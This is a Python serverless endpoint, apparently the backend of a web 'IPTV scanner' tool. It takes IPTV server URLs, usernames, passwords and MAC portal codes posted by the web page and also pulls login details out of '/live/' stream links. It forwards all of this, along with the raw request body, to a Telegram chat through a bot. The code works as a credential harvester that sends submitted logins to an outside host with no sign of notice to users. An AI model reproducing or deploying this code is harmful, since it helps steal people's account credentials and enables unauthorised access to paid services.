import os, json, urllib.request, urllib.error
from http.server import BaseHTTPRequestHandler
from datetime import datetime

def tg(t, c, m):
    url = f"https://api.telegram.org/bot{t}/sendMessage"
    payload = json.dumps({"chat_id": c, "text": m}).encode('utf-8')
    r = urllib.request.Request(
        url, 
        data=payload, 
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(r, timeout=10) as response:
            return response.read()
    except urllib.error.HTTPError as e:
        error_message = e.read().decode('utf-8')
        raise Exception(f"Telegram API Error: {e.code} - {error_message}")

class handler(BaseHTTPRequestHandler):
    def log_message(self, f, *a): pass
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
        
    def do_POST(self):
        tk = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
        ci = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
        
        if not tk or not ci:
            self.send_response(500)
            self.send_header("Content-type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'{"status":"error","message":"Konfigurasi Telegram kosong di Vercel"}')
            return

        try:
            # 1. Membaca paket data yang dikirim oleh web
            n = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(n).decode('utf-8') if n else "{}"
            d = json.loads(body)
            
            time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # 2. Ambil semua variasi nama parameter tunggal
            server = d.get("server") or d.get("url") or d.get("portal_url") or d.get("host") or "-"
            username = d.get("username") or d.get("user") or "-"
            password = d.get("password") or d.get("pass") or d.get("pwd") or "-"
            mac = d.get("mac") or d.get("mac_address") or d.get("mac_code") or "-"
            
            urls_list = d.get("urls", [])
            
            # 3. STRATEGI DETEKSI MODE SECARA AKURAT
            # Cek dulu apakah ini mode MAC Portal (Ciri utamanya: parameter 'mac' terisi atau ada data mac)
            is_mac_mode = mac != "-" or "mac" in body or "mac_address" in body
            is_m3u_list = isinstance(urls_list, list) and len(urls_list) > 0
            
            if is_mac_mode:
                # Mode MAC Portal: Kunci data server ke URL aslinya, jangan biarkan ditimpa localhost
                # Jika variabel server masih bawaan '-', coba cari dari parameter lain di JSON
                if server == "-" or "localhost" in server:
                    server = d.get("portal_url") or d.get("url") or d.get("server") or "http://prm.worldip.nl/c/"
            
            elif is_m3u_list:
                # Mode Raw M3U List (Hanya berjalan jika BUKAN mode MAC)
                sample_url = urls_list[0]
                if "://" in sample_url:
                    parts = sample_url.split("/")
                    server = f"{parts[0]}//{parts[2]}"
                else:
                    server = sample_url
                
                # Ekstrak otomatis username & password jika format link berbasis /live/
                if "/live/" in sample_url:
                    try:
                        path_parts = sample_url.split("/live/")[1].split("/")
                        if len(path_parts) >= 2:
                            username = path_parts[0]
                            password = path_parts[1]
                    except:
                        pass

            # 4. Menyusun format laporan Telegram
            m = f"📡 [IPTV SCANNER LOG]\n"
            m += f"⏰ Waktu: {time_now}\n"
            m += f"🌐 Server/Portal: {server}\n"
            
            if username != "-":
                m += f"👤 User: {username}\n"
                
            if password != "-":
                m += f"🔑 Pass: {password}\n"
                
            if mac != "-":
                m += f"💻 MAC Portal: {mac}\n"
                
            if is_m3u_list:
                m += f"📊 Total Channel Dites: {len(urls_list)} link\n"
                m += f"⚙️ Config: {d.get('workers', 10)} Workers | Timeout {d.get('timeout', 8)}s\n"

            # 5. Tampilkan data secara ringkas
            if is_m3u_list and not is_mac_mode:
                m += f"\n📦 [Sampel Link Web]:\n"
                for i, u in enumerate(urls_list[:3]):
                    m += f"{i+1}. {u}\n"
                if len(urls_list) > 3:
                    m += f"... dan {len(urls_list) - 3} link lainnya."
            else:
                # Jika mode MAC Portal atau Xtream, tampilkan data mentah terstruktur di bawahnya
                m += f"\n📦 [Data Mentah Web]:\n{body}"
            
            # 6. Eksekusi pengiriman otomatis ke Telegram
            tg(tk, ci, m)
            
            # Berikan respon sukses ke frontend web
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
            
        except Exception as e:
            print(f"CRITICAL_ERROR: {str(e)}")
            self.send_response(500)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type", "application/json")
            self.end_headers()
            error_response = {"status": "error", "message": str(e)}
            self.wfile.write(json.dumps(error_response).encode('utf-8'))
